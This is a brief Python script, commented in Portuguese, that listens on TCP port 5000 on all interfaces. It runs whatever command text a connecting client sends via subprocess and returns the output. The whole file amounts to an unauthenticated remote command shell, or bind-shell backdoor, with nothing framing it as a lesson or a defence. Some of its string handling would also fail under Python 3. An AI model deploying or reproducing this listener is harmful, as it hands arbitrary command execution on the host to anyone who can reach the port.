#coding :utf-8

#criado em python 3.6.5

import socket
import subprocess

porta = 5000

tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp.bind(("",porta))
tcp.listen(1)

while True:
	con, cliente = tcp.accept()
	print ("Cliente conectado: ",cliente)
	while True:
		msg = con.recv(2048)
		if msg == 'SAIDA':
			print ("finalizando conexao do cliente", cliente)
			con.close()
			break
		try:
			print ("Comando ",msg)
			lista = msg.split(" ")
			retorno = subprocess.check_output(lista)
			con.sendall(retorno)
		except:
			print("ERRO AO CHECAR COMANDO.")
			con.sendall("ERRO AO CHECAR COMANDO.")
